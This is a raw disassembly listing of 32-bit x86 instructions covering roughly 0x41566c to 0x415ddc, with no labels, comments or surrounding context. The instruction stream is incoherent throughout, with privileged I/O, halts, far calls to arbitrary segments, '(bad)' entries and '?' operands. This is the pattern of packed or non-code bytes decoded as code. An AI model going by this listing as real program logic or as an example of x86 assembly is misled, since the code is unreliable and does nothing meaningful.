  41566c:	mov    bh,0x1c
  41566e:	stc    
  41566f:	mov    gs,WORD PTR es:[edi+0x3f784138]
  415676:	ror    BYTE PTR [ebp-0x37],cl
  415679:	je     0x4156e4
  41567b:	scas   al,BYTE PTR es:[edi]
  41567c:	dec    esp
  41567d:	xchg   esi,eax
  41567e:	out    dx,eax
  41567f:	inc    esi
  415680:	or     eax,0xa93051f3
  415685:	sub    BYTE PTR [ebp+eax*4-0x6d],al
  415689:	jg     0x4156d0
  41568b:	fisttp WORD PTR [edi-0x50e3a2e]
  415691:	push   ebp
  415692:	mov    ebp,0x3a63fd9b
  415697:	jp     0x4156b5
  415699:	add    eax,DWORD PTR [edx+eiz*2]
  41569c:	xchg   esp,eax
  41569d:	jne    0x4156c6
  41569f:	ds out dx,eax
  4156a1:	fistp  WORD PTR [ebx+eiz*1-0x8a1ff03]
  4156a8:	adc    eax,0xa4e85006
  4156ad:	mov    eax,ds:0xb8d693ce
  4156b2:	enter  0xec6,0xcf
  4156b6:	xchg   esi,eax
  4156b7:	ret    
  4156b8:	call   0x4edb:0x15ba8463
  4156bf:	out    0xa9,al
  4156c1:	fiadd  DWORD PTR [esi+esi*8-0x5b507a32]
  4156c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156c9:	nop
  4156ca:	outs   dx,DWORD PTR ds:[esi]
  4156cb:	ret    
  4156cc:	lea    esp,[ebp-0x7d2e9b0e]
  4156d2:	lock mov al,ds:0xeb64f878
  4156d8:	sahf   
  4156d9:	adc    ebp,DWORD PTR [eax]
  4156db:	clc    
  4156dc:	push   edi
  4156dd:	xchg   ebp,eax
  4156de:	cmp    ebp,DWORD PTR [ebx-0x637e3c14]
  4156e4:	out    dx,eax
  4156e5:	cmp    BYTE PTR [ecx+eiz*4],0x5c
  4156e9:	imul   ebx,DWORD PTR [ebp+0x1e],0xefcc06c2
  4156f0:	inc    edx
  4156f1:	fucompp 
  4156f3:	or     DWORD PTR [esi-0x5ff2f5fc],eax
  4156f9:	sahf   
  4156fa:	mov    cl,0xda
  4156fc:	data16 add BYTE PTR [ebx+eiz*2],0xee
  415701:	daa    
  415702:	repz add ah,BYTE PTR [eax]
  415705:	mov    edx,0xcbcd6ec5
  41570a:	out    0x16,eax
  41570c:	aam    0xe
  41570e:	bound  edi,QWORD PTR [esi+0xc2baaf]
  415714:	push   cs
  415715:	sub    cl,BYTE PTR [edx]
  415717:	xchg   edx,eax
  415719:	sbb    DWORD PTR [eax+0x62],ebx
  41571c:	loopne 0x415754
  41571e:	gs jg  0x415748
  415721:	mov    edi,0x3d153744
  415726:	inc    edi
  415727:	aam    0xe5
  415729:	xchg   ecx,eax
  41572a:	js     0x415734
  41572c:	and    al,0x5c
  41572e:	pop    ecx
  41572f:	clc    
  415730:	push   edi
  415731:	pop    esp
  415732:	dec    esp
  415733:	fnstenv [eax+esi*8+0x54]
  415737:	push   esp
  415738:	push   0xe75ccf86
  41573d:	int3   
  41573e:	ja     0x4157a1
  415740:	pop    ebx
  415741:	mov    ?,WORD PTR [ebp+0x5a]
  415744:	xchg   ecx,eax
  415745:	out    dx,al
  415746:	adc    DWORD PTR [esi-0x63],ebp
  415749:	mov    DWORD PTR [edi*8-0x3b694966],0x199ee665
  415754:	adc    BYTE PTR [ebx],bl
  415756:	out    dx,al
  415757:	and    edi,DWORD PTR [ebx+0x1b586c07]
  41575d:	in     eax,0x13
  41575f:	adc    eax,0x768d115d
  415764:	leave  
  415765:	icebp  
  415766:	ficom  WORD PTR [edx-0x1bf8e6df]
  41576c:	shr    eax,cl
  41576e:	fsub   DWORD PTR [edx+0x508b853c]
  415774:	dec    ebp
  415775:	xor    BYTE PTR [ecx],dl
  415777:	repnz retf 0x8975
  41577b:	addr16 out dx,eax
  41577d:	push   edx
  41577e:	outs   dx,BYTE PTR ds:[esi]
  41577f:	fstp   QWORD PTR [eax]
  415781:	and    dh,BYTE PTR [edx]
  415783:	inc    esp
  415784:	sub    cl,BYTE PTR [edi-0x7b2d16d6]
  41578a:	jg     0x41574a
  41578c:	shl    BYTE PTR [esi],1
  41578e:	stos   DWORD PTR es:[edi],eax
  41578f:	ficom  DWORD PTR [edi]
  415791:	and    DWORD PTR [edi],esi
  415793:	inc    edx
  415794:	fadd   st(7),st
  415796:	lock rcl DWORD PTR [eax],0x16
  41579a:	loopne 0x41573e
  41579c:	and    bh,bl
  41579e:	jae    0x415738
  4157a0:	pusha  
  4157a1:	fidiv  WORD PTR [ebp-0x7179b139]
  4157a7:	loope  0x4157b8
  4157a9:	xchg   ecx,eax
  4157aa:	mov    ds:0xa3e4ac18,al
  4157af:	adc    BYTE PTR [edi+ebp*8],0x63
  4157b3:	mov    cl,0x65
  4157b5:	mov    edi,0xfcb0fc85
  4157ba:	ror    edx,1
  4157bc:	sbb    edx,DWORD PTR [ebx+0x4ca789ac]
  4157c2:	fst    DWORD PTR [ecx+0x31]
  4157c5:	xchg   ebp,eax
  4157c6:	retf   
  4157c7:	jo     0x415837
  4157c9:	ins    BYTE PTR es:[edi],dx
  4157ca:	push   eax
  4157cb:	ror    DWORD PTR [eax],cl
  4157cd:	ds mov ch,0x4c
  4157d0:	mov    esi,DWORD PTR [ebx+edx*2+0x1d]
  4157d4:	aas    
  4157d5:	push   0x56
  4157d7:	adc    eax,0x563afee
  4157dc:	nop
  4157dd:	or     al,0x7f
  4157df:	push   edi
  4157e0:	out    dx,ax
  4157e2:	into   
  4157e3:	or     DWORD PTR [ecx-0x47],edx
  4157e6:	add    al,0xc7
  4157e8:	cmp    edx,edx
  4157ea:	push   es
  4157eb:	jno    0x415809
  4157ed:	mov    ah,BYTE PTR [edx+ebx*8-0x75]
  4157f1:	xchg   ecx,eax
  4157f2:	(bad)  
  4157f4:	in     eax,0x13
  4157f6:	pop    esp
  4157f7:	call   FWORD PTR [ebx+0x1174dfc]
  4157fd:	and    al,0x98
  4157ff:	xchg   dl,bl
  415801:	push   edx
  415802:	and    bl,BYTE PTR [eax-0x18]
  415805:	rcl    BYTE PTR [ecx],0x59
  415808:	jg     0x41582e
  41580a:	jo     0x4157e4
  41580c:	retf   
  41580d:	push   ebx
  41580e:	call   DWORD PTR [eax+0xd3210ef]
  415814:	pop    ebp
  415815:	sbb    ebp,eax
  415817:	ret    0x435d
  41581a:	lds    ebx,FWORD PTR [edx+0x3173cb64]
  415820:	into   
  415821:	call   0x74b8:0xf1a9ee5b
  415828:	or     bh,BYTE PTR [ebp+ecx*2-0x4c]
  41582c:	mov    ah,0x7b
  41582e:	test   BYTE PTR [edi+0xc],bh
  415831:	mov    esi,DWORD PTR [edi+0x23]
  415834:	mov    ebp,0x13c8c174
  415839:	shl    DWORD PTR [eax-0xbbb7a6f],1
  41583f:	hlt    
  415840:	(bad)
  415843:	jbe    0x415893
  415845:	imul   eax,esi,0x30
  415848:	mov    ch,0x1d
  41584a:	sbb    edx,esp
  41584c:	fdivr  st,st(2)
  41584e:	jns    0x415808
  415850:	or     DWORD PTR [esi-0x4de9f403],ebx
  415856:	retf   0x2fda
  415859:	fcomi  st,st(2)
  41585b:	and    DWORD PTR [ebx],ebp
  41585d:	imul   edi,DWORD PTR [esi],0xc5a3f8ee
  415863:	xlat   BYTE PTR ds:[ebx]
  415864:	dec    edi
  415865:	jg     0x4158a2
  415867:	je     0x4158c1
  415869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41586a:	(bad)  
  41586b:	out    dx,al
  41586c:	or     eax,0xd32481ce
  415871:	jno    0x41583d
  415873:	jnp    0x4157fb
  415875:	mov    esi,0x40b5ff67
  41587a:	mov    cl,0xe1
  41587c:	(bad)  
  41587d:	aaa    
  41587e:	les    esp,FWORD PTR [ebp+0x6b7840cf]
  415884:	push   ebp
  415885:	xchg   esi,eax
  415886:	mov    DWORD PTR [ebx+0x28],ebx
  415889:	inc    esi
  41588a:	test   DWORD PTR [edx+0x2a],0x4c4e8d6b
  415891:	sbb    eax,0xda5c1bc3
  415896:	mov    edx,0xfdf34ee3
  41589b:	scas   eax,DWORD PTR es:[edi]
  41589c:	pop    es
  41589d:	inc    esi
  41589e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41589f:	xor    dl,al
  4158a1:	sbb    al,0xef
  4158a3:	inc    ecx
  4158a4:	outs   dx,DWORD PTR ds:[esi]
  4158a5:	fimul  DWORD PTR [esp+edi*4-0x3]
  4158a9:	mov    edi,0x38136cfa
  4158ae:	cwde   
  4158af:	icebp  
  4158b0:	push   eax
  4158b1:	pop    ebp
  4158b2:	(bad)  
  4158b3:	(bad)  
  4158b4:	jno    0x415857
  4158b6:	inc    ebx
  4158b7:	dec    eax
  4158b8:	mov    bl,0xe0
  4158ba:	cmp    eax,0x5f1d2099
  4158bf:	inc    edi
  4158c0:	sti    
  4158c1:	cdq    
  4158c2:	pop    ebx
  4158c3:	neg    BYTE PTR [ebp-0x3807f21e]
  4158c9:	pop    ebx
  4158ca:	mov    ds:0x3fa0eb2f,eax
  4158cf:	xchg   ecx,eax
  4158d0:	call   0xa093484
  4158d5:	adc    al,bh
  4158d7:	sbb    edi,DWORD PTR [ebx+0x79]
  4158da:	mov    ch,0xf
  4158dc:	mov    esi,0x3dd141cd
  4158e1:	cmp    BYTE PTR [edx-0x26a4adb3],ch
  4158e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158e8:	adc    BYTE PTR [ebx-0x48],ch
  4158eb:	add    al,bh
  4158ed:	mov    ah,0x86
  4158ef:	pop    ss
  4158f0:	jmp    0xf1a9:0x188347d9
  4158f7:	push   ebp
  4158f8:	out    0xd,al
  4158fa:	pop    ecx
  4158fb:	cmp    al,BYTE PTR [esi+0x3cc63db9]
  415901:	cmp    DWORD PTR [esi-0x57267a35],esp
  415907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415908:	adc    BYTE PTR [ecx],bl
  41590a:	(bad)  
  41590b:	fild   QWORD PTR [eax]
  41590d:	stos   DWORD PTR es:[edi],eax
  41590e:	pop    ecx
  41590f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415910:	pop    esp
  415911:	xor    al,0x58
  415913:	adc    ch,cl
  415915:	cli    
  415916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415917:	mov    bl,0x8a
  415919:	test   al,0xfb
  41591b:	and    esi,0x56
  41591e:	imul   edi,ebp,0x668c5aa4
  415924:	fimul  WORD PTR [esi+0x7b]
  415927:	mov    ah,ah
  415929:	adc    al,0x6d
  41592b:	arpl   WORD PTR gs:[ebx+0x6c8cd14c],di
  415932:	inc    eax
  415933:	and    al,0xf4
  415935:	loope  0x4158c8
  415937:	jmp    0x857348f3
  41593c:	stos   DWORD PTR es:[edi],eax
  41593d:	and    BYTE PTR [edx-0x7e102d81],dl
  415943:	hlt    
  415944:	pop    edi
  415945:	mov    edi,0xfe975108
  41594a:	inc    ecx
  41594b:	imul   ecx,DWORD PTR [eax+0x5e],0xffffffb2
  41594f:	sahf   
  415950:	xchg   DWORD PTR [ebp+0x328efd42],edi
  415956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415957:	ds push eax
  415959:	fxch   st(0)
  41595b:	sbb    al,0x5b
  41595d:	icebp  
  41595e:	inc    esi
  41595f:	btr    DWORD PTR [ebp+0x1eb78aaa],ebp
  415966:	imul   ebp,DWORD PTR [eax+0x4],0x9230503f
  41596d:	mul    DWORD PTR [edx]
  41596f:	pop    edi
  415970:	fdiv   QWORD PTR [eax+0x64604a0a]
  415976:	xor    eax,0xacd3acf3
  41597b:	mov    cl,0x6a
  41597d:	xchg   ebx,eax
  41597e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41597f:	adc    al,0xcc
  415981:	clc    
  415982:	lods   eax,DWORD PTR ds:[esi]
  415983:	pop    esp
  415984:	inc    edi
  415985:	push   ss
  415986:	fst    QWORD PTR [esp+ecx*8]
  415989:	gs js  0x415913
  41598c:	pop    ebp
  41598d:	jmp    0xfb187d4f
  415992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415993:	hlt    
  415994:	or     DWORD PTR [eax],ebp
  415996:	bound  ebp,QWORD PTR [ebx]
  415998:	fs sbb eax,0x276d270d
  41599e:	hlt    
  41599f:	sti    
  4159a0:	dec    esi
  4159a1:	xor    DWORD PTR [eax+0xc],edx
  4159a4:	outs   dx,BYTE PTR ds:[esi]
  4159a5:	mov    cl,0xe7
  4159a7:	daa    
  4159a8:	mov    dl,0xdc
  4159aa:	xchg   BYTE PTR [edx+0x1a],al
  4159ad:	and    al,dh
  4159af:	mov    ebx,0x27a68bfd
  4159b4:	into   
  4159b5:	push   ss
  4159b6:	nop
  4159b7:	es int3 
  4159b9:	sub    ebp,DWORD PTR [esi]
  4159bb:	and    eax,0xeee225fa
  4159c0:	mov    ecx,0x36433d02
  4159c5:	idiv   DWORD PTR [edx]
  4159c7:	sbb    DWORD PTR [esp+edx*8+0x305c3bec],eax
  4159ce:	cdq    
  4159cf:	inc    esp
  4159d0:	jns    0x41599b
  4159d2:	pop    es
  4159d3:	mov    dl,BYTE PTR [eax-0x51]
  4159d6:	inc    edx
  4159d7:	pop    ecx
  4159d8:	(bad)  
  4159d9:	adc    ecx,DWORD PTR [ebp-0x7a]
  4159dc:	xchg   ecx,eax
  4159dd:	mov    cl,0xc9
  4159df:	sub    eax,0xa14582c4
  4159e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159e5:	push   0x6379f661
  4159ea:	retf   
  4159eb:	xlat   BYTE PTR ds:[ebx]
  4159ec:	out    0xec,al
  4159ee:	mov    ecx,0xa6240b67
  4159f3:	fstp   QWORD PTR ds:0xfe97d2ca
  4159f9:	push   0xbd91aaf7
  4159fe:	jb     0x415a70
  415a00:	loopne 0x415a7c
  415a02:	(bad)  
  415a03:	in     al,dx
  415a04:	shl    DWORD PTR [ecx+0x4a],cl
  415a07:	into   
  415a08:	out    dx,eax
  415a09:	sub    eax,0x4c0be168
  415a0e:	fild   DWORD PTR [edx]
  415a10:	sbb    al,BYTE PTR [ebp+0x7a]
  415a13:	in     al,dx
  415a14:	xchg   ecx,eax
  415a15:	mov    ecx,0xc28cdd18
  415a1a:	add    cl,BYTE PTR [ecx-0x3f]
  415a1d:	out    0xe7,eax
  415a1f:	pop    ss
  415a20:	jl     0x4159dc
  415a22:	xlat   BYTE PTR es:[ebx]
  415a24:	pop    esi
  415a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a26:	shl    BYTE PTR [edi+edx*2],cl
  415a29:	outs   dx,BYTE PTR ds:[esi]
  415a2a:	out    0x7e,eax
  415a2c:	leave  
  415a2d:	mov    al,0x88
  415a2f:	sbb    al,ch
  415a31:	mov    esi,0xf74330de
  415a36:	cld    
  415a37:	fs mov ecx,0xed7372d9
  415a3d:	fdiv   QWORD PTR [edx]
  415a3f:	mov    cl,0x35
  415a41:	cmc    
  415a42:	inc    edi
  415a43:	sub    eax,0x7a94b8a9
  415a48:	sub    ebx,DWORD PTR [ecx]
  415a4a:	lds    ebx,FWORD PTR [ebx+0x1]
  415a4d:	mov    bx,0xcbcf
  415a51:	add    eax,0x557ed6f5
  415a56:	std    
  415a57:	in     eax,dx
  415a58:	mov    ebp,0xaa00165
  415a5d:	pop    ds
  415a5e:	adc    al,0xd6
  415a60:	(bad)  
  415a61:	mov    al,cl
  415a63:	sub    DWORD PTR [esi-0x1f],0x29
  415a67:	sbb    bh,BYTE PTR [esi+0x14]
  415a6a:	sar    DWORD PTR [edi-0x7c],0x33
  415a6e:	es js  0x415a5c
  415a71:	inc    eax
  415a72:	lods   al,BYTE PTR ds:[esi]
  415a73:	cmc    
  415a74:	call   0x10553946
  415a79:	das    
  415a7a:	icebp  
  415a7b:	or     bh,0xef
  415a7e:	in     al,dx
  415a7f:	fcomp  QWORD PTR [eax]
  415a81:	lea    edi,[edx-0x1fb7f50c]
  415a87:	inc    edx
  415a88:	sub    BYTE PTR [edi],0x9e
  415a8b:	inc    ebx
  415a8c:	sub    al,BYTE PTR [ebp+0x32]
  415a8f:	dec    ebp
  415a90:	bound  edx,QWORD PTR [ebx-0x12620cf1]
  415a96:	xor    bh,BYTE PTR [edx+edi*2]
  415a99:	mov    eax,ds:0x7cef2d99
  415a9e:	and    ah,cl
  415aa0:	pop    esi
  415aa1:	clc    
  415aa2:	in     eax,0xd5
  415aa4:	fstp   QWORD PTR [esi]
  415aa6:	fadd   QWORD PTR [edx]
  415aa9:	dec    ebp
  415aaa:	ins    BYTE PTR es:[edi],dx
  415aab:	dec    edx
  415aac:	sub    al,0x1e
  415aae:	and    ah,BYTE PTR [edx+0x75]
  415ab1:	out    0xea,eax
  415ab3:	mov    eax,ds:0x489e309f
  415ab8:	repz fnsave [ecx+ecx*1-0x1d]
  415abd:	cmp    bl,BYTE PTR [edx-0xce85779]
  415ac3:	or     dl,BYTE PTR [esi+0x78]
  415ac6:	gs out 0x77,eax
  415ac9:	nop
  415aca:	(bad)  
  415acb:	test   DWORD PTR [ecx],ecx
  415acd:	test   DWORD PTR [edx],ebp
  415acf:	pop    edx
  415ad0:	stos   DWORD PTR es:[edi],eax
  415ad1:	test   cl,bl
  415ad3:	jmp    0x82857838
  415ad8:	sub    edx,ebp
  415ada:	jb     0x415b44
  415adc:	retf   
  415add:	adc    ecx,eax
  415adf:	dec    eax
  415ae0:	xchg   ebp,eax
  415ae1:	aad    0xdf
  415ae3:	mov    bl,0x84
  415ae5:	lods   al,BYTE PTR ds:[esi]
  415ae6:	push   0x19
  415ae8:	xor    ebp,DWORD PTR ds:0xd7eb0021
  415aee:	pop    ebp
  415aef:	test   al,0x28
  415af1:	mov    al,es:0xfe4e5585
  415af7:	sub    al,0xde
  415af9:	add    esi,esi
  415afb:	mov    ch,0x11
  415afd:	pop    es
  415afe:	(bad)  
  415aff:	mov    al,0x83
  415b01:	shl    DWORD PTR [esi-0x645b20b4],cl
  415b07:	pushw  0xfc2c
  415b0b:	push   ebx
  415b0c:	lods   al,BYTE PTR ds:[esi]
  415b0d:	int    0xff
  415b0f:	das    
  415b10:	test   al,0x5d
  415b12:	lods   al,BYTE PTR ds:[esi]
  415b13:	scas   eax,DWORD PTR es:[edi]
  415b14:	rcl    BYTE PTR [edx+0x26],1
  415b17:	inc    esp
  415b18:	scas   eax,DWORD PTR es:[edi]
  415b19:	hlt    
  415b1a:	fs dec esi
  415b1c:	mov    eax,0xeab58338
  415b21:	jecxz  0x415b25
  415b23:	pop    ds
  415b24:	jnp    0x415ad1
  415b26:	sub    edi,DWORD PTR [edi-0x4]
  415b29:	or     cl,BYTE PTR [eax-0x51]
  415b2c:	mov    ecx,0xd516e978
  415b31:	mov    al,ds:0x42c6ade5
  415b36:	pop    edi
  415b37:	out    dx,eax
  415b38:	xchg   ebx,eax
  415b3a:	mov    edi,DWORD PTR [edx]
  415b3c:	popw   gs
  415b3f:	hlt    
  415b40:	xor    eax,0x41259a43
  415b45:	je     0x415b15
  415b47:	mov    ebp,DWORD PTR [edi+0x1e]
  415b4a:	aad    0x33
  415b4c:	inc    ebx
  415b4d:	jl     0x415b27
  415b4f:	out    0x5c,eax
  415b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b52:	and    bl,BYTE PTR [eax+0x15]
  415b55:	icebp  
  415b56:	leave  
  415b57:	popf   
  415b58:	das    
  415b59:	pop    ebx
  415b5a:	mov    bl,0xed
  415b5c:	mov    ebp,0x29527140
  415b61:	call   0xa4db:0xb47dad07
  415b68:	into   
  415b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b6a:	inc    ebp
  415b6b:	ret    
  415b6c:	mov    al,0x21
  415b6e:	icebp  
  415b6f:	jns    0x415be4
  415b71:	jnp    0x415b46
  415b73:	(bad)  
  415b74:	sub    BYTE PTR [esi-0x233eb5f3],ch
  415b7a:	aaa    
  415b7b:	nop
  415b7c:	mov    ds:0x5baaf0d1,al
  415b81:	loopne 0x415b62
  415b83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b84:	es loopne 0x415bbe
  415b87:	dec    eax
  415b88:	mov    ebp,0xd6aa9c67
  415b8d:	xchg   esi,eax
  415b8e:	out    dx,al
  415b8f:	pop    esp
  415b90:	pop    ds
  415b91:	sbb    eax,0xd609cace
  415b96:	repz clc 
  415b98:	aam    0xb6
  415b9a:	or     bh,BYTE PTR [eax]
  415b9c:	scas   eax,DWORD PTR es:[edi]
  415b9d:	(bad)  
  415b9e:	retf   
  415b9f:	cld    
  415ba0:	dec    ecx
  415ba1:	pop    ss
  415ba2:	rcl    ebx,1
  415ba4:	mov    DWORD PTR [edi+0x3],eax
  415ba7:	scas   eax,DWORD PTR es:[edi]
  415ba8:	dec    edi
  415ba9:	pop    edx
  415baa:	mov    edx,0xf317e94e
  415baf:	loope  0x415c2e
  415bb1:	gs mov esi,0xab20fcc2
  415bb7:	jbe    0x415c26
  415bb9:	pop    ecx
  415bba:	out    0x87,al
  415bbc:	jle    0x415c18
  415bbe:	rol    BYTE PTR [edi-0x2b],1
  415bc1:	aam    0x6b
  415bc3:	(bad)  
  415bc4:	cmp    BYTE PTR [ecx+0x4c2d4ec6],bh
  415bca:	inc    esp
  415bcb:	xchg   DWORD PTR [eax-0x74876d95],edx
  415bd1:	pop    ebx
  415bd2:	adc    eax,0xe2683b27
  415bd7:	into   
  415bd8:	inc    eax
  415bd9:	mov    edx,DWORD PTR [ebx]
  415bdb:	add    BYTE PTR [esi+0x0],cl
  415bde:	xchg   edi,eax
  415bdf:	adc    DWORD PTR [eax-0x162a933e],edi
  415be5:	sub    BYTE PTR [esi+0x66c1a40d],dh
  415beb:	sub    DWORD PTR [esi-0x7199e31e],ebp
  415bf1:	push   edx
  415bf2:	std    
  415bf3:	cmc    
  415bf4:	and    edx,DWORD PTR [ebx]
  415bf6:	pop    edx
  415bf7:	xchg   BYTE PTR [esi+edi*2+0x3c],al
  415bfb:	inc    ebp
  415bfc:	sbb    cl,BYTE PTR [ebx-0x717cbfe8]
  415c02:	cmp    bl,BYTE PTR [ebx-0x5e]
  415c05:	jne    0x415b88
  415c07:	push   cs
  415c08:	jbe    0x415c23
  415c0a:	jnp    0x415baa
  415c0c:	push   ebp
  415c0d:	(bad)  
  415c0e:	(bad)  
  415c0f:	jecxz  0x415be0
  415c11:	push   ss
  415c12:	ror    BYTE PTR ds:0xb3be9dd6,1
  415c18:	pop    eax
  415c19:	add    al,0x8b
  415c1b:	mov    ?,WORD PTR [edx-0x2dc3e069]
  415c21:	jl     0x415ba7
  415c23:	mov    bh,0xb0
  415c25:	jl     0x415c4c
  415c27:	stos   DWORD PTR es:[edi],eax
  415c28:	lds    edx,FWORD PTR [ecx+ecx*2]
  415c2b:	sub    eax,ebp
  415c2d:	sbb    DWORD PTR [esi],0x935cd1b5
  415c33:	stos   DWORD PTR es:[edi],eax
  415c34:	jbe    0x415c42
  415c36:	jae    0x415cad
  415c38:	sbb    al,0xd7
  415c3a:	sti    
  415c3b:	pop    ebp
  415c3c:	cmp    al,0xaa
  415c3e:	jle    0x415c58
  415c40:	jb     0x415c34
  415c42:	sbb    BYTE PTR [edi],bh
  415c44:	push   edi
  415c45:	test   bl,bh
  415c47:	int3   
  415c48:	jno    0x415c48
  415c4a:	sub    DWORD PTR [eax],edx
  415c4c:	and    dl,BYTE PTR cs:[ebx+0x24b9005c]
  415c53:	xlat   BYTE PTR ds:[ebx]
  415c54:	popf   
  415c55:	stos   DWORD PTR es:[edi],eax
  415c56:	sub    BYTE PTR [edi],bh
  415c58:	lahf   
  415c59:	adc    esi,DWORD PTR ds:0xe07de345
  415c5f:	jns    0x415c96
  415c61:	dec    esi
  415c62:	jno    0x415c73
  415c64:	sub    al,0x76
  415c66:	je     0x415c30
  415c68:	inc    ebp
  415c69:	add    DWORD PTR [edx],0xa5dcdd94
  415c6f:	repz arpl bx,bp
  415c72:	inc    ebx
  415c73:	mov    al,ds:0xc5528c45
  415c78:	addr16 leave 
  415c7a:	or     al,0xa2
  415c7c:	xchg   edx,eax
  415c7d:	sub    BYTE PTR [edx-0x31],ch
  415c80:	mov    dl,0xf6
  415c82:	outs   dx,DWORD PTR ds:[esi]
  415c83:	ror    BYTE PTR [ecx-0x5b42806f],0x98
  415c8a:	(bad)  
  415c8b:	pop    ecx
  415c8c:	leave  
  415c8d:	mov    esi,0x18c4acba
  415c92:	hlt    
  415c93:	xchg   edx,eax
  415c94:	inc    edi
  415c95:	lahf   
  415c96:	(bad)  
  415c97:	std    
  415c98:	xor    ebp,ebp
  415c9a:	out    dx,al
  415c9b:	out    dx,al
  415c9c:	rol    ch,0x7d
  415c9f:	scas   eax,DWORD PTR es:[edi]
  415ca0:	daa    
  415ca1:	sbb    dl,BYTE PTR [edx+0x3a]
  415ca4:	adc    esi,DWORD PTR [esi+0x59]
  415ca7:	out    0xb0,eax
  415ca9:	aam    0x9
  415cab:	loope  0x415d11
  415cad:	bound  ebp,QWORD PTR [esi]
  415caf:	push   0x11
  415cb1:	cs mov bh,0x18
  415cb4:	dec    eax
  415cb5:	cs pop esp
  415cb7:	test   eax,0xc59abbf8
  415cbc:	ds out 0xc1,al
  415cbf:	and    BYTE PTR [edi-0x23],dh
  415cc2:	ins    DWORD PTR es:[edi],dx
  415cc3:	int    0x69
  415cc5:	outs   dx,DWORD PTR ds:[esi]
  415cc6:	mov    ebp,?
  415cc8:	cmp    DWORD PTR [edx-0x49cd59bb],0xffffff8e
  415ccf:	stos   DWORD PTR es:[edi],eax
  415cd0:	and    esi,edx
  415cd2:	xor    BYTE PTR [ebp-0x152104a2],0xc9
  415cd9:	stos   DWORD PTR es:[edi],eax
  415cda:	or     esp,ecx
  415cdc:	sahf   
  415cdd:	ja     0x415cb9
  415cdf:	scas   al,BYTE PTR es:[edi]
  415ce0:	cwde   
  415ce1:	xor    al,ch
  415ce3:	push   cs
  415ce4:	xchg   esp,eax
  415ce5:	sub    BYTE PTR [edx-0xc24fb92],bh
  415ceb:	out    0x4f,ax
  415cee:	hlt    
  415cef:	mov    ah,0x96
  415cf1:	in     eax,dx
  415cf2:	adc    DWORD PTR [esi],esp
  415cf4:	fidivr WORD PTR [esi+0x46ef4612]
  415cfa:	dec    ebp
  415cfb:	push   cs
  415cfc:	sbb    DWORD PTR [esp+ecx*1],0x3b
  415d00:	fimul  WORD PTR [ecx+0x6cfdb6dc]
  415d06:	leave  
  415d07:	or     DWORD PTR [ecx-0x3574b708],edi
  415d0d:	out    0x25,al
  415d0f:	adc    eax,0x6058e26d
  415d14:	in     eax,0x5c
  415d16:	test   DWORD PTR [esi+0x4f],ecx
  415d19:	and    eax,0x1e0b17c
  415d1e:	pop    es
  415d1f:	retf   0xc2bf
  415d22:	add    esi,edi
  415d24:	mov    ah,0x72
  415d26:	pop    ds
  415d27:	xor    ebx,DWORD PTR [ebx+edx*1-0x19]
  415d2b:	inc    ecx
  415d2c:	mov    ds:0xa7cc9874,al
  415d31:	bswap  ecx
  415d33:	sub    edi,esp
  415d35:	test   BYTE PTR [eax+0x1e],dh
  415d38:	xor    edi,DWORD PTR [ebx+0x37bdfad]
  415d3e:	lahf   
  415d3f:	fs sub eax,0x779cef1
  415d45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d46:	fisttp WORD PTR [edx-0x30a64fa7]
  415d4c:	sbb    ebp,DWORD PTR [edi-0x2ae03707]
  415d52:	adc    DWORD PTR [ebx-0x4ec8b49],ebp
  415d58:	loopne 0x415d6d
  415d5a:	jg     0x415d0d
  415d5c:	js     0x415dba
  415d5e:	aas    
  415d5f:	jae    0x415d34
  415d61:	fadd   DWORD PTR [ecx+ebx*8-0x555cf7d2]
  415d68:	cmp    BYTE PTR [eax+0x383d00db],dh
  415d6e:	dec    edx
  415d6f:	jo     0x415dbe
  415d71:	mov    ds:0x32764ab8,al
  415d76:	push   ebp
  415d77:	daa    
  415d78:	cmp    BYTE PTR [edi+0xc],0x7f
  415d7c:	std    
  415d7d:	sub    BYTE PTR [ecx-0x22],0x8
  415d81:	pop    esp
  415d82:	aad    0x72
  415d84:	(bad)  
  415d85:	push   esi
  415d86:	ds or  ah,ch
  415d89:	dec    edx
  415d8a:	loopne 0x415de3
  415d8c:	(bad)  
  415d8e:	aaa    
  415d8f:	adc    DWORD PTR [ebp-0x2591ad61],ecx
  415d95:	gs jge 0x415df2
  415d98:	xlat   BYTE PTR ds:[ebx]
  415d99:	ror    DWORD PTR [esi+0xc8875e3],1
  415d9f:	jne    0x415dbb
  415da1:	cmp    eax,0x1f4934e6
  415da6:	es (bad) 
  415da8:	mov    ecx,0xccb0dbfc
  415dad:	in     al,dx
  415dae:	mov    bl,0xaa
  415db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415db1:	or     ebp,DWORD PTR fs:[eax-0x5305a91c]
  415db8:	mov    WORD PTR [esi+0x20],ds
  415dbb:	fs std 
  415dbd:	pop    esp
  415dbe:	repz das 
  415dc0:	xchg   edx,eax
  415dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dc2:	cli    
  415dc3:	fwait
  415dc4:	cld    
  415dc5:	ficomp WORD PTR [edi+0x27]
  415dc8:	into   
  415dc9:	ins    BYTE PTR es:[edi],dx
  415dca:	pop    edi
  415dcb:	ins    BYTE PTR es:[edi],dx
  415dcc:	sbb    esi,ecx
  415dce:	push   esi
  415dcf:	in     al,0xd4
  415dd1:	push   esp
  415dd2:	das    
  415dd3:	(bad)  
  415dd4:	test   al,0x29
  415dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dd7:	cmp    eax,0x37185312
  415ddc:	sti    
